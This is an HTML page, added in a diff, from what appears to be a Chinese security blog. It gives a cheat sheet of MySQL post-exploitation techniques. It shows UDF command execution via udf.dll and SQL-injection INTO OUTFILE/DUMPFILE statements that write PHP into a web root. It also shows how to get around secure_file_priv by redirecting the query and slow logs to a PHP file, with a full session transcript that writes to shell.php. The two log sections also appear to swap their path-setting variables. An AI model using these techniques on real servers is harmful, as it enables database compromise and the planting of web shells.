@@ -1,0 +1,211 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head><meta name="generator" content="Hexo 3.9.0">
+    <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+
+
+<title>mysql突破方法总结 | langke Blog</title>
+
+
+
+    <link rel="icon" href="/favicon.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+</head>
+<body>
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">langke&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+
+            </div>
+
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">langke&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+        <div class="main">
+            <div class="container">
+    
+    
+        <div id="post-toc" class="post-toc">
+            <span class="post-toc-title">catalogue</span>
+            <div class="post-toc-content">
+                <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Mysql-突破方法整理"><span class="toc-text">Mysql 突破方法整理</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-MOF提权写文件"><span class="toc-text">0x01 MOF提权写文件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-UDF提权写文件"><span class="toc-text">0x02 UDF提权写文件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-Into-Outfile写文件"><span class="toc-text">0x03 Into Outfile写文件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-secure-file-priv突破"><span class="toc-text">0x04 secure_file_priv突破</span></a></li></ol></li></ol>
+            </div>
+        </div>
+    
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">mysql突破方法总结</h1>
+            
+                <div class="post-meta">
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">09 05&nbsp;&nbsp;09:47:08</a>
+                        </span>
+                    
+                    
+                </div>
+            
+        </header>
+
+        <section class="post-content">
+            <h1 id="Mysql-突破方法整理"><a href="#Mysql-突破方法整理" class="headerlink" title="Mysql 突破方法整理"></a>Mysql 突破方法整理</h1><h2 id="0x01-MOF提权写文件"><a href="#0x01-MOF提权写文件" class="headerlink" title="0x01 MOF提权写文件"></a>0x01 MOF提权写文件</h2><h2 id="0x02-UDF提权写文件"><a href="#0x02-UDF提权写文件" class="headerlink" title="0x02 UDF提权写文件"></a>0x02 UDF提权写文件</h2><p>UDF：User Defined Function（用户自定义函数）<br>使用这种方法有两个前置条件：<br>通过select @@basedir查看安装目录；（不在C盘）<br>通过show variables like ‘%secure%’;查看参数当前状态。（为空）</p>
+<p>把 udf.dll 文件导入到plugin目录<code>select @@plugin_dir;</code>，//对于mysql小于5.1的，导出目录为<code>C:\Windows\</code>或<code>C:\Windows\System32\</code></p>
+<p>create function system returns string soname ‘udf.dll’;</p>
+<p>select system(‘whoami’);</p>
+<h2 id="0x03-Into-Outfile写文件"><a href="#0x03-Into-Outfile写文件" class="headerlink" title="0x03 Into Outfile写文件"></a>0x03 Into Outfile写文件</h2><p>想要利用，首先来了解MySQL配置的一个参数：<code>secure-file-priv</code></p>
+<p><code>secure-file-priv</code>参数是用来限制<code>LOAD DATA</code>, <code>SELECT ... OUTFILE</code>, and <code>LOAD_FILE()</code>传到哪个指定目录的。<br><code>secure_file_priv</code>的值为<code>null</code> ，表示限制<code>mysqld</code>不允许导入|导出<br>当<code>secure_file_priv</code>的值为<code>/tmp/</code> ，表示限制<code>mysqld</code>的导入|导出只能发生在<code>/tmp/</code>目录下<br>当<code>secure_file_priv</code>的值没有具体值时，表示不对<code>mysqld</code>的导入|导出做限</p>
+<p>查看参数值：<code>show global variables like &#39;%secure%&#39;;</code></p>
+<p>所以，当<code>secure-file-priv</code>的值为空时，就可以读写文件了。<br>用到的语句：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select * from admin where id=1 union select &apos;&lt;?php phpinfo(); ?&gt;&apos; into dumpfile &quot;E:\\phpStudy\\PHPTutorial\\WWW\\mysql.php&quot;</span><br><span class="line">select * from admin where id=1 union select &apos;&lt;?php phpinfo(); ?&gt;&apos; into outfile &quot;E:\\phpStudy\\PHPTutorial\\WWW\\mysql.php&quot;</span><br><span class="line">select * from admin where id=1 into outfile &apos;E:\\phpStudy\\PHPTutorial\\WWW\\mysql.php&apos; fields terminated by &apos;&lt;?php phpinfo(); ?&gt;&apos;</span><br></pre></td></tr></table></figure></p>
+<h2 id="0x04-secure-file-priv突破"><a href="#0x04-secure-file-priv突破" class="headerlink" title="0x04 secure_file_priv突破"></a>0x04 secure_file_priv突破</h2><p>当 MySQL配置 secure_file_priv 的值为NULL时，Into Outfile就没办法写文件了。<br>secure_file_priv的值不能通过MySQL命令直接更改，只能通过mysql.ini配置文件更改，这种情况下就要考虑突破secure_file_priv限制了。</p>
+<p>下面介绍下MySQL的几种日志（只介绍可以修改日志文件路径的）：</p>
+<ol>
+<li>查询日志</li>
+</ol>
+<p>其中查询日志记录查询操作，默认情况下查询日志是关闭的。开启查询日志会增加很多磁盘 I/O， 所以如非出于调试目的，一般未开启查询日志。<br>查询配置：<code>SHOW VARIABLES LIKE &#39;general_log%&#39;;</code><br>开启配置：<code>set global general_log=1</code><br>设置路径：<code>set global slow_query_log_file=&#39;E:\\phpStudy\\PHPTutorial\\WWW\\phpinfo.php&#39;;</code><br>写入数据：<code>select &#39;&lt;?php phpinfo();?&gt;&#39;;</code></p>
+<ol start="2">
+<li>慢查询日志</li>
+</ol>
+<p>慢查询是指执行时长（包括等待CPU/IO的时间）超过 long_query_time 这个变量定义的时长的查询。慢查询日志开销比较小，可以用于定位性能问题。</p>
+<p>log_slow_queries=1    //MySQL 5.6将此参数修改为了slow_query_log<br>查询配置：<code>show variables like &#39;%slow_query_log%&#39;;</code><br>开启配置：<code>set global slow_query_log=1;</code> //MySQL 5.6 之前将此参数修改为了 log_slow_queries<br>设置路径：<code>set global general_log_file=&#39;E:\\phpStudy\\PHPTutorial\\WWW\\phpinfo.php&#39;</code><br>查看超时时长：<code>show global variables like &#39;%long_query_time%&#39;;</code><br>写入数据：<code>select &#39;&lt;?php phpinfo();?&gt;&#39; or sleep(11);</code></p>
+<p>下面为慢查询日志写文件演示过程：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select &quot;&lt;?php phpinfo(); ?&gt;&quot; into outfile &quot;E:\phpStudy\PHPTutorial\WWW\mysql.php&quot;;</span><br><span class="line">ERROR 1290 (HY000): The MySQL server is running with the --secure-file-priv option so it cannot execute this statement</span><br><span class="line">mysql&gt; show variables like &apos;%slow_query_log%&apos;;</span><br><span class="line">+---------------------+-------------------------------------------------------------+</span><br><span class="line">| Variable_name       | Value                                                       |</span><br><span class="line">+---------------------+-------------------------------------------------------------+</span><br><span class="line">| slow_query_log      | OFF                                                         |</span><br><span class="line">| slow_query_log_file | E:\phpStudy\PHPTutorial\MySQL\data\DESKTOP-BMNHHGR-slow.log |</span><br><span class="line">+---------------------+-------------------------------------------------------------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; set global slow_query_log=1;</span><br><span class="line">Query OK, 0 rows affected (0.01 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; show variables like &apos;%slow_query_log%&apos;;</span><br><span class="line">+---------------------+-------------------------------------------------------------+</span><br><span class="line">| Variable_name       | Value                                                       |</span><br><span class="line">+---------------------+-------------------------------------------------------------+</span><br><span class="line">| slow_query_log      | ON                                                          |</span><br><span class="line">| slow_query_log_file | E:\phpStudy\PHPTutorial\MySQL\data\DESKTOP-BMNHHGR-slow.log |</span><br><span class="line">+---------------------+-------------------------------------------------------------+</span><br><span class="line">2 rows in set (0.02 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; set global slow_query_log_file=&apos;E:\\phpStudy\\PHPTutorial\\WWW\\shell.php&apos;;</span><br><span class="line">Query OK, 0 rows affected (0.01 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; show variables like &apos;%slow_query_log%&apos;;</span><br><span class="line">+---------------------+---------------------------------------+</span><br><span class="line">| Variable_name       | Value                                 |</span><br><span class="line">+---------------------+---------------------------------------+</span><br><span class="line">| slow_query_log      | ON                                    |</span><br><span class="line">| slow_query_log_file | E:\phpStudy\PHPTutorial\WWW\shell.php |</span><br><span class="line">+---------------------+---------------------------------------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select &apos;&lt;?php phpinfo();?&gt;&apos; or sleep(1);</span><br><span class="line">+----------------------------------+</span><br><span class="line">| &apos;&lt;?php phpinfo();?&gt;&apos; or sleep(1) |</span><br><span class="line">+----------------------------------+</span><br><span class="line">|                                0 |</span><br><span class="line">+----------------------------------+</span><br><span class="line">1 row in set, 1 warning (1.01 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select &apos;&lt;?php phpinfo();?&gt;&apos; or sleep(1);</span><br><span class="line">+----------------------------------+</span><br><span class="line">| &apos;&lt;?php phpinfo();?&gt;&apos; or sleep(1) |</span><br><span class="line">+----------------------------------+</span><br><span class="line">|                                0 |</span><br><span class="line">+----------------------------------+</span><br><span class="line">1 row in set, 1 warning (1.01 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select &apos;&lt;?php phpinfo();?&gt;&apos; or sleep(11);</span><br><span class="line">+-----------------------------------+</span><br><span class="line">| &apos;&lt;?php phpinfo();?&gt;&apos; or sleep(11) |</span><br><span class="line">+-----------------------------------+</span><br><span class="line">|                                 0 |</span><br><span class="line">+-----------------------------------+</span><br><span class="line">1 row in set, 1 warning (11.01 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; show global variables like &apos;%long_query_time%&apos;;</span><br><span class="line">+-----------------+-----------+</span><br><span class="line">| Variable_name   | Value     |</span><br><span class="line">+-----------------+-----------+</span><br><span class="line">| long_query_time | 10.000000 |</span><br><span class="line">+-----------------+-----------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+        </section>
+
+        
+            <section class="post-copyright">
+                
+                
+                
+                
+
+            </section>
+        
+
+        <!--
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/mysql/"># mysql</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        -->
+        <!--
+        <section class="post-nav">
+            
+            
+            <a class="next" rel="next" href="/2019/08/18/业务逻辑漏洞整理/">业务逻辑漏洞整理</a>
+            
+        </section>
+        -->
+
+    </article>
+</div>
+
+        </div>
+        <!--
+        <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© langke | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
+
+    	-->
+
+    	<br>
+    	<br>
+    	<br>
+
+
+
+    </div>
+</body>
+</html>
